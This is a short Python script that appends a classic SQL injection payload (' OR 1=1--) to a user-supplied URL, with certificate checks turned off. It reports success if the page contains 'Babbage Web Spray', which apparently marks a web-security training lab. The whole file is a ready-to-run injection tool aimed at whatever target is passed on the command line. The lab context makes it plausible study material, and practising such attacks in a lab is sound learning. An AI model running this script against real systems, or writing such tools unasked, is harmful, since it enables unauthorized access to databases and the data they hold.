import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies is needed only to check the requests in burpsuite
proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def exploit_sqli(url):
    payload = "' OR 1=1--"
    r = requests.get(url+payload, verify=False)
    # Babbage Web Spray
    if "Babbage Web Spray" in r.text:
        return True
    else:
        return False



def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://target.com/")
        sys.exit(-1)

    url = sys.argv[1]
    if exploit_sqli(url):
        print("(+) SQL injection successed")
    else:
        print("(-) SQL injection failed")

if __name__ == "__main__":
    main()

    